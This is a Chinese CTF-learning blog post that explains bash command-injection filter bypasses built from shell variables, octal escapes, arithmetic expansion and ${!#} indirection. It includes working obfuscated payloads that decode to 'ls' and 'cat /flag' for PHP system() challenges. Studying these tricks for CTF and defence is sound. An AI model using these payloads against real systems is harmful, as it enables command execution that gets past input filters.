<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>shell变量执行RCE | B1ueL0n3's blog</title><meta name="author" content="B1ueL0n3"><meta name="copyright" content="B1ueL0n3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言shell变量实现RCE这种思路最早提出于2017年34c3CTF里的minbashmaxfun，随后2020安洵杯也有Web-Bash-Vino0o0o 而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;bashFuck?tab&#x3D;readme-ov-file bash的参考手册：https:&#x2F;&#x2F;www.gnu.org">
<meta property="og:type" content="article">
<meta property="og:title" content="shell变量执行RCE">
<meta property="og:url" content="https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/index.html">
<meta property="og:site_name" content="B1ueL0n3&#39;s blog">
<meta property="og:description" content="前言shell变量实现RCE这种思路最早提出于2017年34c3CTF里的minbashmaxfun，随后2020安洵杯也有Web-Bash-Vino0o0o 而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;bashFuck?tab&#x3D;readme-ov-file bash的参考手册：https:&#x2F;&#x2F;www.gnu.org">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://b1uel0n3.github.io/img/12.jpg">
<meta property="article:published_time" content="2025-03-06T15:04:31.000Z">
<meta property="article:modified_time" content="2025-03-07T10:01:18.754Z">
<meta property="article:author" content="B1ueL0n3">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="shell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://b1uel0n3.github.io/img/12.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "shell变量执行RCE",
  "url": "https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/",
  "image": "https://b1uel0n3.github.io/img/12.jpg",
  "datePublished": "2025-03-06T15:04:31.000Z",
  "dateModified": "2025-03-07T10:01:18.754Z",
  "author": [
    {
      "@type": "Person",
      "name": "B1ueL0n3",
      "url": "https://b1uel0n3.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'shell变量执行RCE',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/9.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/" title="回到主页"><span class="site-name">B1ueL0n3's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">shell变量执行RCE</span></a><!--鼠标下滑时的文章标题显示--></span><div class="mask-name-container"><center id="name-container"><a id="page-name" href="javascript:btf.scrollToDest(0, 500)"></a></center></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">shell变量执行RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-06T15:04:31.000Z" title="发表于 2025-03-06 23:04:31">2025-03-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-07T10:01:18.754Z" title="更新于 2025-03-07 18:01:18">2025-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0/RCE/">RCE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>shell变量实现RCE这种思路最早提出于2017年34c3CTF里的<a target="_blank" rel="noopener" href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
<p><strong>而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file">https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</a></strong></p>
<p><strong>bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></strong></p>
<h3 id="shell脚本-的用法"><a href="#shell脚本-的用法" class="headerlink" title="shell脚本$的用法"></a>shell脚本$的用法</h3><p>首先先了解下linux shell脚本中$的用法</p>
<table>
<thead>
<tr>
<th>变量名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>脚本本身的名字</td>
</tr>
<tr>
<td>$1</td>
<td>脚本后所输入的第一串字符</td>
</tr>
<tr>
<td>$2</td>
<td>传递给该shell脚本的第二个参数</td>
</tr>
<tr>
<td>$*</td>
<td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td>
</tr>
<tr>
<td>$@</td>
<td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td>
</tr>
<tr>
<td>$_</td>
<td>表示上一个命令的最后一个参数</td>
</tr>
<tr>
<td>$#</td>
<td>#脚本后所输入的字符串个数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>表示最后执行的后台命令的PID</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态，0表示没有错误，其他表示由错误</td>
</tr>
</tbody></table>
<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>打CTF时，在过滤了字母的情况下我们可以采用八进制的形式绕过，即使用**<code>$&#39;xxx&#39;</code>（xxx为字符的八进制）的形式来执行命令<strong>，如</strong><code>$&#39;\154\163&#39;</code>表示<code>ls</code>**</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210609.png"></p>
<p>但这有个缺陷，即**<code>$&#39;&#39;</code>中命令是不能接参数的，因为整个字符串被<code>$&#39;&#39;</code>包裹时，它会被当作一个整体字符串来处理，而linux没有<code>ls /</code>的单一命令，所以会报错**</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210926.png"></p>
<p>那么应该怎么构造呢？</p>
<p>这里有两个思路，一是<strong>利用重定向<code>&lt;</code>将<code>/flag</code>内容传递给<code>cat</code>执行，再输出他们执行的结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-211504.png"></p>
<p>但有个缺陷就是需要知道flag文件名。所以需要另一种方法，<strong>即<code>bash&lt;&lt;&lt;&#123;......&#125;</code>会将大括号里的内容交给bash解析，参数用<code>,</code>隔开，如<code>bash&lt;&lt;&lt;&#123;cat,/f*&#125;</code>、<code>bash&lt;&lt;&lt;&#123;ls,/&#125;</code><strong>，</strong>而bash可以用<code>$0</code>表示</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\154\163&#x27;</span>,$<span class="string">&#x27;\057&#x27;</span>&#125;</span>  </span><br><span class="line">//bash&lt;&lt;&lt;&#123;ls,/&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\143\141\164&#x27;</span>,$<span class="string">&#x27;\057\146\052&#x27;</span>&#125;  //bash&lt;&lt;&lt;&#123;<span class="built_in">cat</span>,/f*&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213119.png"></p>
<p><strong>如果没有参数则不用大括号，不然会报错</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213256.png"></p>
<p><strong>当然没有大括号也是能执行命令的</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-222627.png"></p>
<p>通过上面的例子我们发现我们可以在数字可用的情况下进行命令执行</p>
<p>除此之外，在<strong>linux中<code>$(())</code>用于算术运算，即括号内的内容为进行运算的部分，默认情况下<code>$(())</code>为0</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213735.png"></p>
<p>这样不就能随便构造数字了嘛，再结合**<code>$&#39;&#39;</code>**来执行RCE，可以发现这样有些多此一举，但如果只能使用1或0来构造命令时它的用处就大了。</p>
<p>这里还有个知识点，即<strong>bash里面可以使用<code>[bash#]n</code>的方式表示数字，即<code>2#100</code>表示2进制下的100，换成10进制即4</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-214745.png"></p>
<p>现在知识点铺垫完了，直接开整。现在我们字母或数字只有0，1可用来进行命令执行，这时可用位移运算<code>1&lt;&lt;1</code>来代替2，payload:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100011))\&#x27;</span>  </span><br><span class="line">//ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001111))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100100))\&#x27;,$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#111001))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010011))\&#x27;&#125;</span></span><br><span class="line">//bash&lt;&lt;&lt;&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221018.png"></p>
<p>但似乎不能用f*匹配了，但<code>ls /</code>都能执行，还怕不知道文件名嘛</p>
<p>但有一点需要注意的是，bash在执行命令前，会对命令进行一系列扩展（expansions），这些扩展包括花括号扩展（brace expansion）、波浪号扩展（tilde expansion）、<strong>参数和变量扩展</strong>（parameter and variable expansion）、<strong>算术扩展（arithmetic expansion）、命令替换（command substitution）</strong>、单词分割（word splitting）和文件名扩展（filename expansion）等，最重要的是这些扩展的顺序是固定的，而且是从左到右进行的。</p>
<p>而我们的八进制转义也就是$’\xxx\xxx’依赖于<strong>参数和变量扩展</strong>，转义后的结果是个<strong>字符串</strong>，即使用过一次bash了，由于我们本地就是bash环境，会默认解析，即输入**<code>$&#39;\154\163&#39;</code><strong>会解析执行，而我们带参数的命令还需执行</strong>单词分割扩展**，即<code>$&#39;\143\141\164\40\57\146\154\141\147&#39;</code>时本地bash已经解析为了<code>cat /flag</code>字符串，但无法进行单词分隔扩展，所以会把命令当成一个整体，所以执行后会显示<code>bash: cat /flag: 没有那个文件或目录</code>。所以一般情况下还需要一个bash，即<code>bash&lt;&lt;&lt;$&#39;\143\141\164\40\57\146\154\141\147&#39;</code></p>
<p>而我们有些时候还需要进行的操作是<strong>算术扩展</strong>和<strong>命令替换</strong>，所以一般除了本地解析外，还需要一个bash，即**<code>bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;......</code>**，后面会讲到</p>
<p>具体原理文章参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p>
<p>可用看到这种构造方式不够极限，里面不仅出现了0还出现了1，<strong>下面我们开始真正的无字母数字构造</strong></p>
<h3 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用$#构造</h3><p>在shell中，<code>$#</code>表示脚本后所输入的字符串个数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221718.png"></p>
<blockquote>
<p><strong>$# -参数数量-单独使用结果为0</strong></p>
<p><strong>$ -计数变量（#）长度，这里的结果为1</strong></p>
</blockquote>
<p>这里0和1都有了，那构造命令不就只用换一下嘛</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$#</span>&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span> </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-223822.png"></p>
<p>测试发现不是这样的，虽然**$0表示bash，$<code>，在linux中</code>${!}&#96;表示间接引用**，举个例子:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh:</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=<span class="string">&quot;11111&quot;</span></span><br><span class="line">var2=<span class="string">&quot;var1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!var2&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225012.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-035026.png"></p>
<blockquote>
<p><strong>可认为${!a}&#x3D;$$a</strong></p>
</blockquote>
<p>因此我们只用找到一个值为0的变量来替换即可，而<code>$#</code>值恰好为0,所以**<code>$&#123;!#&#125;</code>就能使用**</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225822.png"></p>
<p>那么bash有了，<strong>其余的0和1换成<code>$#</code>和<code>$</code>即可</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230306.png"></p>
<p>由于这里只需要进行<strong>参数和变量扩展</strong>和<strong>单词分割</strong>，所以除本地解析外一个bash就够了，两个也不影响：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;<span class="variable">$&#123;!#&#125;</span>\&lt;\&lt;\&lt;\$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意转义，主要使用这种形式</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235408.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230730.png"></p>
<p>但在有些题中有可能**<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来**，可以换另一种形式，即变量拼接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231515.png"></p>
<p>加了$__作为过渡，减少了解析过程</p>
<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$#;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">//bash&lt;&lt;&lt;bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure>

